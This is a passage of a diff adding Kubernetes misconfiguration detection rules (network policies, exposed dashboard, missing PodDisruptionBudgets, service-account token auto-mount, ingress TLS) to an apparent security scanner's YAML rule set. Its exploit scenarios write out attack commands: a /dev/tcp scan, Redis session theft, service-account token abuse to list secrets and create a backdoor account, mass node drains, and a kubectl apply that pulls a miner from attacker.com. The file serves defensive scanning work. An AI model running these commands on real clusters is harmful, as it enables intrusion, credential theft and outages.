+    \ {}\n  policyTypes:\n    - Ingress\n    - Egress\n```\n\n## CIS Benchmark References\n- CIS Kubernetes Benchmark 5.3.2: Ensure that all Namespaces have Network Policies defined\n\n## Additional Remediation\n\
+    - Use Calico or Cilium for advanced network policy features\n- Implement DNS-based egress policies to restrict external communication\n- Use Istio AuthorizationPolicy for L7 traffic control\n- Audit\
+    \ network policies with kubectl-who-can and network-policy-viewer\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/284.html
+  - https://kubernetes.io/docs/concepts/services-networking/network-policies/
+  - https://www.cisecurity.org/benchmark/kubernetes
+  - https://attack.mitre.org/techniques/T1046/
+  - https://docs.projectcalico.org/security/kubernetes-network-policy
+  context_awareness:
+    surrounding_context_patterns:
+    - 'kind: Namespace'
+    - 'kind: Deployment'
+    - 'kind: StatefulSet'
+    - 'kind: DaemonSet'
+    - 'kind: Service'
+    - 'metadata:'
+    - 'namespace:'
+    taint_source_indicators:
+    - 'kind: Service'
+    - 'type: ClusterIP'
+    - 'type: NodePort'
+    - 'type: LoadBalancer'
+    - 'ports:'
+    taint_sink_indicators:
+    - no NetworkPolicy in namespace
+    - default namespace
+    - missing policyTypes
+    sanitization_patterns:
+    - 'kind: NetworkPolicy'
+    - 'podSelector:'
+    - 'policyTypes:'
+    - calico GlobalNetworkPolicy
+    - CiliumNetworkPolicy
+    - istio AuthorizationPolicy
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
+    exploitability_score: 0.85
+  exploit_scenario:
+    attack_example: 'Lateral Movement via Flat Network: An attacker exploits an RCE vulnerability in a web-facing pod. Without NetworkPolicies, they scan the internal cluster network, discover a Redis instance
+      without authentication on port 6379, dump cached session tokens, and pivot to access the main application database in a different namespace containing customer PII.
+
+      '
+    example_payload: "# From compromised pod: scan internal network\nfor i in $(seq 1 254); do\n  timeout 1 bash -c \"echo > /dev/tcp/10.0.0.$i/6379\" 2>/dev/null && echo \"Redis found: 10.0.0.$i\"\ndone\n\
+      # Connect to discovered Redis\nredis-cli -h 10.0.0.42 KEYS '*session*'\nredis-cli -h 10.0.0.42 GET session:admin\n# Pivot to database\npsql -h 10.0.1.15 -U app -d production -c \"SELECT * FROM users\
+      \ LIMIT 10\"\n"
+    attacker_objective: 'Exploit the flat network topology to move laterally between pods, access databases, steal credentials from caches, and exfiltrate sensitive data across namespace boundaries.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.85
+    context_match: 0.88
+    proximity_to_user_input: 0.2
+    sanitization_absence: 0.9
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - DEVOPS-YAML-003
+    - DEVOPS-YAML-001
+    - DEVOPS-YAML-014
+- rule_id: DEVOPS-YAML-011
+  title: Exposed Kubernetes Dashboard
+  description: 'Detects Kubernetes Dashboard deployments with insecure configurations such as skip-login enabled, exposed via NodePort or LoadBalancer, cluster-admin role bindings, or missing authentication.
+    The Kubernetes Dashboard provides full cluster management capabilities and, when exposed without proper authentication, grants attackers complete control over the cluster including deploying workloads,
+    reading secrets, and deleting resources.
+
+    '
+  language: yaml
+  category: devops
+  severity: Critical
+  confidence: 0.94
+  cwe: CWE-269
+  owasp: A05:2021-Security-Misconfiguration
+  tags:
+  - kubernetes
+  - dashboard
+  - authentication-bypass
+  - cluster-admin
+  - cis-benchmark
+  - exposed-management
+  - unauthorized-access
+  detection_layer: 1
+  attack_surface_type: management-interface
+  patterns:
+  - type: regex
+    pattern: kubernetes-dashboard\s*\n(?:.*\n){0,20}?--enable-skip-login
+  - type: regex
+    pattern: args\s*:\s*\n(?:\s+-\s+.*\n){0,15}?\s+-\s+--enable-skip-login
+  - type: regex
+    pattern: kind\s*:\s*ClusterRoleBinding\s*\n(?:.*\n){0,20}?kubernetes-dashboard(?:.*\n){0,20}?cluster-admin
+  - type: regex
+    pattern: kind\s*:\s*Service\s*\n(?:.*\n){0,20}?kubernetes-dashboard(?:.*\n){0,20}?type\s*:\s*(?:NodePort|LoadBalancer)
+  - type: regex
+    pattern: --enable-insecure-login
+  - type: regex
+    pattern: --authentication-mode\s*=\s*(?:basic|token)\s*\n(?:.*\n){0,20}?--enable-skip-login
+  anti_patterns:
+  - 'type: ClusterIP'
+  - '# internal only'
+  - oauth2-proxy
+  - dex
+  - oidc
+  - authentication-mode=token
+  - gatekeeper.sh/constraint
+  - NetworkPolicy
+  - rbac.authorization.k8s.io
+  - ingress.kubernetes.io/auth-type
+  bypass_variants:
+  - description: Dashboard with token auth but overly permissive RBAC
+    pattern: ClusterRoleBinding(?:.*\n)*?dashboard(?:.*\n)*?ClusterRole(?:.*\n)*?cluster-admin
+  - description: Dashboard exposed through ingress without auth
+    pattern: kind\s*:\s*Ingress(?:.*\n)*?dashboard(?:.*\n)*?(?!auth)
+  - description: Skip login combined with insecure port binding
+    pattern: --enable-skip-login(?:.*\n)*?--insecure-bind-address\s*=\s*0\.0\.0\.0
+  evasion_indicators:
+  - --enable-skip-login
+  - --insecure-bind-address=0.0.0.0
+  - --insecure-port
+  - 'type: NodePort'
+  - cluster-admin
+  encoding_variants:
+  - description: Helm values enabling skip login
+    pattern: dashboard\.skipLogin\s*:\s*true
+  - description: Base64 encoded dashboard args in ConfigMap
+    pattern: LS0tZW5hYmxlLXNraXAtbG9naW4
+  multi_function_chain_patterns:
+  - description: Dashboard with skip-login plus cluster-admin binding
+    chain:
+    - --enable-skip-login
+    - ClusterRoleBinding
+    - cluster-admin
+  - description: Dashboard exposed externally without auth proxy
+    chain:
+    - kubernetes-dashboard
+    - 'type: LoadBalancer'
+    - no oauth2-proxy or OIDC
+  privilege_context_flags:
+    requires_cluster_admin: true
+    requires_namespace_admin: false
+    network_exposure: external
+  business_logic_indicator:
+    data_sensitivity: critical
+    compliance_relevant: true
+    regulatory_frameworks:
+    - PCI-DSS
+    - SOC2
+    - HIPAA
+    - NIST-800-53
+  probable_taint_paths:
+  - source: Externally accessible dashboard URL
+    sink: Kubernetes API server via dashboard proxy
+    propagation: Unauthenticated web request to full cluster admin
+  impact: 'An exposed Kubernetes Dashboard with skip-login or cluster-admin
+
+    privileges gives any network-accessible user full control over
+
+    the entire cluster. Attackers can deploy cryptominers, read all
+
+    secrets including TLS certificates and database credentials,
+
+    delete critical workloads, and establish persistent backdoors.
+
+    The Tesla cryptojacking incident (2018) was caused by exactly
+
+    this misconfiguration.
+
+    '
+  remediation: "## Secure Dashboard Configuration\n- Remove --enable-skip-login flag\n- Remove --enable-insecure-login flag\n- Use token-based authentication with RBAC\n- Never bind the dashboard ClusterRoleBinding\
+    \ to cluster-admin\n\n## Access Control\n- Use kubectl proxy for local access instead of NodePort/LoadBalancer\n- Deploy an OAuth2 proxy (e.g., oauth2-proxy, dex) in front of the dashboard\n- Bind dashboard\
+    \ ServiceAccount to namespace-scoped roles only\n\n## CIS Benchmark References\n- CIS Kubernetes Benchmark 1.2.6: Ensure that the --enable-admission-plugins argument includes NodeRestriction\n- Restrict\
+    \ dashboard access to cluster administrators only\n\n## OPA Rego Policy\n```rego\npackage kubernetes.admission\ndeny[msg] {\n  input.request.kind.kind == \"Deployment\"\n  contains(input.request.object.metadata.name,\
+    \ \"dashboard\")\n  args := input.request.object.spec.template.spec.containers[_].args\n  arg := args[_]\n  contains(arg, \"--enable-skip-login\")\n  msg := \"Dashboard skip-login must not be enabled\"\
+    \n}\n```\n\n## Additional Remediation\n- Consider removing the dashboard entirely in production\n- Use Lens, k9s, or headlamp as safer alternatives\n- Apply NetworkPolicy to restrict dashboard access\
+    \ to admin CIDRs only\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/269.html
+  - https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/
+  - https://www.cisecurity.org/benchmark/kubernetes
+  - https://attack.mitre.org/techniques/T1078/
+  - https://redlock.io/blog/cryptojacking-tesla
+  context_awareness:
+    surrounding_context_patterns:
+    - kubernetes-dashboard
+    - 'kind: Deployment'
+    - 'kind: Service'
+    - 'kind: ClusterRoleBinding'
+    - 'kind: Ingress'
+    - dashboard
+    - 'args:'
+    taint_source_indicators:
+    - values.yaml
+    - helm template
+    - '{{ .Values.dashboard'
+    - skipLogin
+    - enableInsecureLogin
+    taint_sink_indicators:
+    - --enable-skip-login
+    - --enable-insecure-login
+    - cluster-admin
+    - 'type: NodePort'
+    - 'type: LoadBalancer'
+    sanitization_patterns:
+    - 'type: ClusterIP'
+    - oauth2-proxy
+    - dex
+    - oidc
+    - NetworkPolicy
+    - ingress auth annotation
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
+    exploitability_score: 0.96
+  exploit_scenario:
+    attack_example: 'Dashboard Takeover for Cluster Compromise: An attacker discovers the Kubernetes Dashboard exposed on a NodePort (e.g., port 30443) via an internet scan. With --enable-skip-login enabled
+      and a cluster-admin ClusterRoleBinding, they click "Skip" on the login page and gain full administrative access to the cluster. They deploy a cryptominer DaemonSet across all nodes, exfiltrate all
+      Secrets, and create a backdoor ServiceAccount with long-lived tokens.
+
+      '
+    example_payload: "# Discover exposed dashboard\nnmap -p 30000-32767 target-cluster.example.com\n# Access dashboard without authentication\ncurl -k https://target-cluster.example.com:30443/\n# Via dashboard\
+      \ API: list all secrets\ncurl -k https://target-cluster.example.com:30443/api/v1/secret/default\n# Deploy cryptominer via dashboard\nkubectl --server=https://target-cluster.example.com:30443 \\\n\
+      \  apply -f https://attacker.com/miner-daemonset.yaml\n"
+    attacker_objective: 'Gain full cluster administrative access through the unauthenticated dashboard to deploy malicious workloads, steal secrets and credentials, and establish persistent backdoor access.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.95
+    context_match: 0.94
+    proximity_to_user_input: 0.4
+    sanitization_absence: 0.94
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: low
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - DEVOPS-YAML-001
+    - DEVOPS-YAML-013
+    - DEVOPS-YAML-010
+- rule_id: DEVOPS-YAML-012
+  title: Missing Pod Disruption Budget
+  description: 'Detects Kubernetes Deployments, StatefulSets, and ReplicaSets without corresponding PodDisruptionBudget (PDB) resources. Without a PDB, voluntary disruptions such as node drains, cluster
+    upgrades, and autoscaler scale-downs can simultaneously terminate all replicas of a workload, causing application downtime. In adversarial scenarios, an attacker with node-level access can trigger mass
+    pod evictions to cause denial of service.
+
+    '
+  language: yaml
+  category: devops
+  severity: Medium
+  confidence: 0.8
+  cwe: CWE-400
+  owasp: A05:2021-Security-Misconfiguration
+  tags:
+  - kubernetes
+  - pod-disruption-budget
+  - availability
+  - denial-of-service
+  - cluster-stability
+  - high-availability
+  - resilience
+  detection_layer: 1
+  attack_surface_type: availability
+  patterns:
+  - type: regex
+    pattern: kind\s*:\s*Deployment\s*\n(?:(?!PodDisruptionBudget).){0,500}
+  - type: regex
+    pattern: kind\s*:\s*StatefulSet\s*\n(?:(?!PodDisruptionBudget).){0,500}
+  - type: regex
+    pattern: replicas\s*:\s*[2-9]\d*\s*\n(?:(?!PodDisruptionBudget).){0,500}
+  - type: regex
+    pattern: kind\s*:\s*(?:Deployment|StatefulSet)\s*\n(?:\s+.*\n){0,20}?\s+replicas\s*:\s*[2-9]
+  - type: regex
+    pattern: apiVersion\s*:\s*apps/v1\s*\nkind\s*:\s*(?:Deployment|StatefulSet)\s*\n(?:(?!minAvailable|maxUnavailable).){0,500}
+  anti_patterns:
+  - 'kind: PodDisruptionBudget'
+  - policy/v1
+  - minAvailable
+  - maxUnavailable
+  - 'replicas: 1'
+  - gatekeeper.sh/constraint
+  - kyverno.io/policy
+  - '# single replica intended'
+  - 'kind: Job'
+  - 'kind: CronJob'
+  bypass_variants:
+  - description: PDB with minAvailable set to 0 offering no protection
+    pattern: minAvailable\s*:\s*0
+  - description: PDB with maxUnavailable matching total replicas
+    pattern: maxUnavailable\s*:\s*100%
+  - description: PDB selector not matching deployment labels
+    pattern: PodDisruptionBudget(?:.*\n)*?selector(?:.*\n)*?matchLabels(?:.*\n)*?(?!app)
+  evasion_indicators:
+  - 'minAvailable: 0'
+  - 'maxUnavailable: 100%'
+  - mismatched selector labels
+  - PDB in different namespace
+  encoding_variants:
+  - description: Helm conditional disabling PDB
+    pattern: '{{-\s*if\s+\.Values\.pdb\.enabled\s*}}'
+  - description: Kustomize patch removing PDB
+    pattern: \$patch\s*:\s*delete.*PodDisruptionBudget
+  multi_function_chain_patterns:
+  - description: Multi-replica deployment without matching PDB
+    chain:
+    - 'kind: Deployment'
+    - 'replicas: [2-9]'
+    - no PodDisruptionBudget with matching selector
+  privilege_context_flags:
+    requires_cluster_admin: false
+    requires_namespace_admin: true
+    network_exposure: internal
+  business_logic_indicator:
+    data_sensitivity: medium
+    compliance_relevant: true
+    regulatory_frameworks:
+    - SOC2
+    - SLA-compliance
+  probable_taint_paths:
+  - source: Node drain or cluster upgrade event
+    sink: All pod replicas terminated simultaneously
+    propagation: Voluntary disruption without availability guarantee
+  impact: 'Without PodDisruptionBudgets, cluster operations like node drains,
+
+    upgrades, and autoscaler events can terminate all replicas of a
+
+    workload simultaneously, causing application downtime. For
+
+    stateful workloads, this can result in data loss or corruption.
+
+    This is critical for meeting SLA and uptime requirements.
+
+    '
+  remediation: "## PodDisruptionBudget Configuration\n- Create a PDB for every production Deployment and StatefulSet with > 1 replica\n- Use minAvailable or maxUnavailable to guarantee minimum availability\n\
+    \n## PDB Template\n```yaml\napiVersion: policy/v1\nkind: PodDisruptionBudget\nmetadata:\n  name: my-app-pdb\nspec:\n  minAvailable: 1\n  selector:\n    matchLabels:\n      app: my-app\n```\n\n## Best\
+    \ Practices\n- Set minAvailable to at least 1 for critical workloads\n- Use percentage-based values for dynamic scaling: minAvailable: \"50%\"\n- Ensure PDB selector labels match the Deployment/StatefulSet\
+    \ pod template labels\n- Test PDB effectiveness: kubectl drain node --dry-run\n\n## Additional Remediation\n- Use Helm chart helpers to auto-generate PDBs alongside Deployments\n- Enforce PDB creation\
+    \ via OPA Gatekeeper or Kyverno policies\n- Monitor PDB violations in cluster events\n- Set appropriate terminationGracePeriodSeconds for graceful shutdown\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/400.html
+  - https://kubernetes.io/docs/tasks/run-application/configure-pdb/
+  - https://kubernetes.io/docs/concepts/workloads/pods/disruptions/
+  - https://attack.mitre.org/techniques/T1499/
+  context_awareness:
+    surrounding_context_patterns:
+    - 'kind: Deployment'
+    - 'kind: StatefulSet'
+    - 'kind: ReplicaSet'
+    - 'replicas:'
+    - 'spec:'
+    - 'template:'
+    - 'selector:'
+    taint_source_indicators:
+    - kubectl drain
+    - cluster-autoscaler
+    - node upgrade
+    - spot instance termination
+    taint_sink_indicators:
+    - all replicas evicted
+    - no PDB defined
+    - missing minAvailable
+    sanitization_patterns:
+    - 'kind: PodDisruptionBudget'
+    - minAvailable
+    - maxUnavailable
+    - policy/v1
+    - topologySpreadConstraints
+    - podAntiAffinity
+  severity_scoring:
+    severity_weight: 5
+    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
+    exploitability_score: 0.6
+  exploit_scenario:
+    attack_example: 'DoS via Node Drain Abuse: An attacker with RBAC permissions to drain nodes (e.g., through a compromised CI/CD service account or misconfigured RBAC) drains multiple nodes simultaneously.
+      Without PDBs, all replicas of critical services are evicted at once, causing complete application downtime until the pods are rescheduled on remaining healthy nodes.
+
+      '
+    example_payload: '# Attacker with node drain permissions
+
+      kubectl drain node-1 --ignore-daemonsets --delete-emptydir-data --force
+
+      kubectl drain node-2 --ignore-daemonsets --delete-emptydir-data --force
+
+      kubectl drain node-3 --ignore-daemonsets --delete-emptydir-data --force
+
+      # All replicas evicted simultaneously - application offline
+
+      kubectl get pods -l app=critical-service
+
+      # No pods running
+
+      '
+    attacker_objective: 'Cause application-wide denial of service by triggering mass pod evictions through node drains or other voluntary disruption mechanisms, exploiting the absence of PodDisruptionBudgets.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.78
+    context_match: 0.82
+    proximity_to_user_input: 0.15
+    sanitization_absence: 0.8
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+  cross_rule_intelligence:
+    cross_file_risk_flag: false
+    requires_ai_validation: true
+    high_impact_flag: false
+    related_rules:
+    - DEVOPS-YAML-007
+    - DEVOPS-YAML-010
+- rule_id: DEVOPS-YAML-013
+  title: Insecure Service Account Token Auto-Mount
+  description: 'Detects pods and service accounts with automountServiceAccountToken set to true (or not explicitly disabled), which automatically mounts the Kubernetes API token inside every pod. This token
+    grants API access corresponding to the service account''s RBAC permissions and can be stolen by an attacker who compromises the pod to escalate privileges, enumerate cluster resources, and move laterally
+    within the cluster.
+
+    '
+  language: yaml
+  category: devops
+  severity: High
+  confidence: 0.9
+  cwe: CWE-269
+  owasp: A05:2021-Security-Misconfiguration
+  tags:
+  - kubernetes
+  - service-account
+  - token-mount
+  - rbac
+  - least-privilege
+  - cis-benchmark
+  - credential-exposure
+  - lateral-movement
+  detection_layer: 1
+  attack_surface_type: identity
+  patterns:
+  - type: regex
+    pattern: automountServiceAccountToken\s*:\s*true
+  - type: regex
+    pattern: kind\s*:\s*ServiceAccount\s*\n(?:(?!automountServiceAccountToken\s*:\s*false).){0,500}
+  - type: regex
+    pattern: kind\s*:\s*Pod\s*\n(?:(?!automountServiceAccountToken).){0,500}
+  - type: regex
+    pattern: serviceAccountName\s*:\s*\S+\s*\n(?:(?!automountServiceAccountToken\s*:\s*false).){0,500}
+  - type: regex
+    pattern: spec\s*:\s*\n(?:[ \t]+.{0,500}\n){0,20}?serviceAccountName\s*:\s*\w+\s*\n(?:(?!automountServiceAccountToken).){0,500}
+  anti_patterns:
+  - 'automountServiceAccountToken: false'
+  - '# token not needed'
+  - 'pod-security.kubernetes.io/enforce: restricted'
+  - gatekeeper.sh/constraint
+  - kyverno.io/policy
+  - projected volume for token
+  - TokenRequest API
+  - audience-bound token
+  - expirationSeconds
+  bypass_variants:
+  - description: Token mounted but with overly permissive RBAC role
+    pattern: ClusterRoleBinding(?:.*\n)*?serviceAccount(?:.*\n)*?cluster-admin
+  - description: Default service account with custom role bindings
+    pattern: serviceAccountName\s*:\s*default(?:.*\n)*?RoleBinding
+  - description: Token auto-mounted via namespace default SA
+    pattern: kind\s*:\s*ServiceAccount\s*\n(?:.*\n)*?name\s*:\s*default
+  evasion_indicators:
+  - 'automountServiceAccountToken: true'
+  - using default service account
+  - no RBAC restrictions on SA
+  - cluster-wide role binding
+  encoding_variants:
+  - description: Helm template defaulting to auto-mount
+    pattern: '{{-\s*default\s+true\s+\.Values\.serviceAccount\.automount'
+  - description: Kustomize patch enabling auto-mount
+    pattern: automountServiceAccountToken\s*:\s*true
+  multi_function_chain_patterns:
+  - description: Pod with auto-mounted token and network access to API server
+    chain:
+    - 'automountServiceAccountToken: true'
+    - serviceAccountName
+    - no NetworkPolicy restricting API server access
+  - description: Service account with cluster-admin and auto-mount
+    chain:
+    - 'kind: ServiceAccount'
+    - ClusterRoleBinding
+    - cluster-admin
+  privilege_context_flags:
+    requires_cluster_admin: false
+    requires_namespace_admin: false
+    network_exposure: internal
+  business_logic_indicator:
+    data_sensitivity: high
+    compliance_relevant: true
+    regulatory_frameworks:
+    - PCI-DSS
+    - SOC2
+    - NIST-800-53
+  probable_taint_paths:
+  - source: Auto-mounted service account token at /var/run/secrets/kubernetes.io/serviceaccount/token
+    sink: Kubernetes API server
+    propagation: Token theft from compromised pod to API server authentication
+  impact: 'Auto-mounted service account tokens provide every pod with API
+
+    credentials that can be used to query the Kubernetes API, list
+
+    secrets, create workloads, and escalate privileges depending on
+
+    the service account''s RBAC bindings. This violates the principle
+
+    of least privilege and CIS Kubernetes Benchmark 5.1.6.
+
+    '
+  remediation: "## Kubernetes Service Account Security\n- Set automountServiceAccountToken: false on all pods that do not need API access\n- Set automountServiceAccountToken: false on service accounts by\
+    \ default\n- Use projected volume tokens with audience and expiration constraints\n\n## CIS Benchmark References\n- CIS Kubernetes Benchmark 5.1.5: Ensure that default service accounts are not actively\
+    \ used\n- CIS Kubernetes Benchmark 5.1.6: Ensure that Service Account Tokens are only mounted where necessary\n\n## Pod-Level Disable Template\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name:\
+    \ my-pod\nspec:\n  automountServiceAccountToken: false\n  containers:\n    - name: app\n      image: my-app:latest\n```\n\n## OPA Rego Policy\n```rego\npackage kubernetes.admission\ndeny[msg] {\n  input.request.kind.kind\
+    \ == \"Pod\"\n  not input.request.object.spec.automountServiceAccountToken == false\n  msg := \"Pods must set automountServiceAccountToken: false\"\n}\n```\n\n## Additional Remediation\n- Use bound\
+    \ service account tokens (TokenRequest API) with short TTL\n- Apply least-privilege RBAC roles to service accounts\n- Block API server access with NetworkPolicies where possible\n- Use Workload Identity\
+    \ (GKE) or IAM Roles for Service Accounts (EKS) instead\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/269.html
+  - https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/
+  - https://www.cisecurity.org/benchmark/kubernetes
+  - https://attack.mitre.org/techniques/T1528/
+  - https://attack.mitre.org/techniques/T1550/001/
+  context_awareness:
+    surrounding_context_patterns:
+    - 'kind: Pod'
+    - 'kind: Deployment'
+    - 'kind: ServiceAccount'
+    - 'serviceAccountName:'
+    - 'automountServiceAccountToken:'
+    - 'spec:'
+    - 'template:'
+    taint_source_indicators:
+    - /var/run/secrets/kubernetes.io/serviceaccount/token
+    - 'serviceAccountName:'
+    - 'automountServiceAccountToken: true'
+    - default service account
+    taint_sink_indicators:
+    - Kubernetes API server
+    - kubectl commands from within pod
+    - curl https://kubernetes.default.svc
+    - API server on 443
+    sanitization_patterns:
+    - 'automountServiceAccountToken: false'
+    - projected volume with audience
+    - expirationSeconds
+    - TokenRequest API
+    - Workload Identity
+    - IAM Roles for Service Accounts
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
+    exploitability_score: 0.88
+  exploit_scenario:
+    attack_example: 'Token Theft for Cluster Enumeration: An attacker exploits an SSRF or RCE vulnerability in a web application running in Kubernetes. They read the auto-mounted service account token from
+      /var/run/secrets/kubernetes.io/serviceaccount/token and use it to query the Kubernetes API. If the service account has broad RBAC permissions, they enumerate all secrets, deploy a reverse shell DaemonSet,
+      or create a new cluster-admin service account.
+
+      '
+    example_payload: "# Read the auto-mounted service account token\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nAPISERVER=https://kubernetes.default.svc\n# Enumerate cluster resources\n\
+      curl -sk -H \"Authorization: Bearer $TOKEN\" $APISERVER/api/v1/namespaces\ncurl -sk -H \"Authorization: Bearer $TOKEN\" $APISERVER/api/v1/secrets\n# If SA has escalated permissions: create backdoor\n\
+      curl -sk -H \"Authorization: Bearer $TOKEN\" -X POST \\\n  $APISERVER/api/v1/namespaces/default/serviceaccounts \\\n  -d '{\"metadata\":{\"name\":\"backdoor\"}}'\n"
+    attacker_objective: 'Steal the auto-mounted Kubernetes API token to enumerate cluster resources, read secrets, escalate privileges via RBAC, and establish persistent access through new service accounts
+      or backdoor deployments.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.9
+    context_match: 0.9
+    proximity_to_user_input: 0.35
+    sanitization_absence: 0.92
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: low
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - DEVOPS-YAML-002
+    - DEVOPS-YAML-011
+    - DEVOPS-YAML-010
+- rule_id: DEVOPS-YAML-014
+  title: Missing Ingress TLS Configuration
+  description: 'Detects Kubernetes Ingress resources without TLS configuration, exposing web traffic in cleartext over HTTP. Without TLS termination at the ingress level, all traffic between clients and
+    the cluster is transmitted unencrypted, enabling man-in-the-middle attacks, credential interception, session hijacking, and data exfiltration. This applies to both external and internal ingress endpoints.
+
+    '
+  language: yaml
+  category: devops
+  severity: High
+  confidence: 0.89
+  cwe: CWE-319
+  owasp: A02:2021-Cryptographic-Failures
+  tags:
+  - kubernetes
+  - ingress
+  - tls
+  - encryption
+  - transport-security
+  - cis-benchmark
+  - cleartext
+  - https
+  detection_layer: 1
+  attack_surface_type: network
+  patterns:
+  - type: regex
+    pattern: kind\s*:\s*Ingress\s*\n(?:(?!tls\s*:).){0,500}
+  - type: regex
+    pattern: 'kind\s*:\s*Ingress\s*\n(?:.{0,500}\n){0,20}?spec\s*:\s*\n(?:(?!tls\s*:).){0,500}rules\s*:'
+  - type: regex
+    pattern: 'kind\s*:\s*Ingress\s*\n(?:.{0,500}\n){0,20}?annotations\s*:\s*\n(?:(?!ssl-redirect|force-ssl).){0,500}\n\s+spec\s*:'
+  - type: regex
+    pattern: nginx\.ingress\.kubernetes\.io/ssl-redirect\s*:\s*['"]?false['"]?
+  - type: regex
+    pattern: kind\s*:\s*Ingress\s*\n(?:.{0,500}\n){0,20}?rules\s*:\s*\n\s+-\s+host\s*:\s*\S+\s*\n(?:(?!tls).){0,500}
+  anti_patterns:
+  - 'tls:'
+  - 'secretName:'
+  - 'ssl-redirect: "true"'
+  - 'force-ssl-redirect: "true"'
+  - cert-manager.io
+  - letsencrypt
+  - acme
+  - nginx.ingress.kubernetes.io/ssl-redirect
+  - 'traefik.ingress.kubernetes.io/redirect-entry-point: https'
+  - gatekeeper.sh/constraint
+  bypass_variants:
+  - description: TLS configured but ssl-redirect disabled allowing HTTP fallback
+    pattern: tls\s*:(?:.*\n)*?ssl-redirect\s*:\s*['"]?false
+  - description: Ingress with TLS but wildcard certificate for all domains
+    pattern: tls\s*:\s*\n\s+-\s+hosts\s*:\s*\n\s+-\s*['"]?\*
+  - description: TLS termination at LB but unencrypted backend
+    pattern: backend-protocol\s*:\s*['"]?HTTP['"]?
+  evasion_indicators:
+  - 'ssl-redirect: false'
+  - no tls block in spec
+  - HTTP backend protocol
+  - insecure port 80 only
+  encoding_variants:
+  - description: Helm template conditionally disabling TLS
+    pattern: '{{-\s*if\s+\.Values\.ingress\.tls\.enabled\s*}}'
+  - description: Kustomize overlay removing TLS section
+    pattern: \$patch\s*:\s*delete.*tls
+  multi_function_chain_patterns:
+  - description: Ingress without TLS serving external traffic
+    chain:
+    - 'kind: Ingress'
+    - 'host: *.example.com'
+    - no tls block
+  - description: Ingress with HTTP backend and no redirect
+    chain:
+    - 'kind: Ingress'
+    - 'backend-protocol: HTTP'
+    - 'ssl-redirect: false'
+  privilege_context_flags:
+    requires_cluster_admin: false
+    requires_namespace_admin: true
+    network_exposure: external
+  business_logic_indicator:
+    data_sensitivity: high
+    compliance_relevant: true
+    regulatory_frameworks:
+    - PCI-DSS
+    - HIPAA
+    - SOC2
+    - GDPR
+  probable_taint_paths:
+  - source: Client HTTP request to ingress endpoint
+    sink: Backend service receiving cleartext traffic
+    propagation: Unencrypted network path from client through ingress to pod
+  impact: 'Ingress resources without TLS expose all web traffic in cleartext,
+
+    enabling interception of authentication credentials, session tokens,
+
+    API keys, and sensitive data. This violates PCI-DSS Requirement 4.1
+
+    (encrypt transmission of cardholder data), HIPAA security rules, and
+
+    general security best practices for transport encryption.
+
+    '
+  remediation: "## Kubernetes Ingress TLS Configuration\n- Add TLS section to every Ingress resource\n- Enable SSL redirect annotations to force HTTPS\n- Use cert-manager for automated certificate management\n\
+    \n## TLS Ingress Template\n```yaml\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: my-ingress\n  annotations:\n    nginx.ingress.kubernetes.io/ssl-redirect: \"true\"\n    cert-manager.io/cluster-issuer:\
+    \ letsencrypt-prod\nspec:\n  tls:\n    - hosts:\n        - app.example.com\n      secretName: app-tls-cert\n  rules:\n    - host: app.example.com\n      http:\n        paths:\n          - path: /\n\
+    \            pathType: Prefix\n            backend:\n              service:\n                name: my-service\n                port:\n                  number: 443\n```\n\n## CIS Benchmark References\n\
+    - Ensure all externally facing services use TLS 1.2+\n- Configure HSTS headers for web applications\n- Use end-to-end encryption from ingress to backend pods\n\n## Additional Remediation\n- Deploy cert-manager\
+    \ with Let's Encrypt for auto-renewal\n- Use HSTS preloading for critical domains\n- Enforce TLS via OPA/Kyverno admission policies\n- Monitor certificate expiration with cert-manager alerts\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/319.html
+  - https://kubernetes.io/docs/concepts/services-networking/ingress/#tls
+  - https://cert-manager.io/docs/
+  - https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html
+  - https://attack.mitre.org/techniques/T1557/
+  context_awareness:
+    surrounding_context_patterns:
+    - 'kind: Ingress'
+    - networking.k8s.io/v1
+    - 'spec:'
+    - 'rules:'
+    - 'host:'
+    - 'annotations:'
+    - 'tls:'
+    taint_source_indicators:
+    - values.yaml
+    - '{{ .Values.ingress'
+    - 'host:'
+    - 'rules:'
+    - 'paths:'
+    taint_sink_indicators:
+    - no tls block
+    - 'ssl-redirect: false'
+    - HTTP backend
+    - 'port: 80'
+    sanitization_patterns:
+    - 'tls:'
+    - 'secretName:'
+    - cert-manager.io
+    - 'ssl-redirect: true'
+    - 'force-ssl-redirect: true'
+    - HSTS
+  severity_scoring:
+    severity_weight: 8
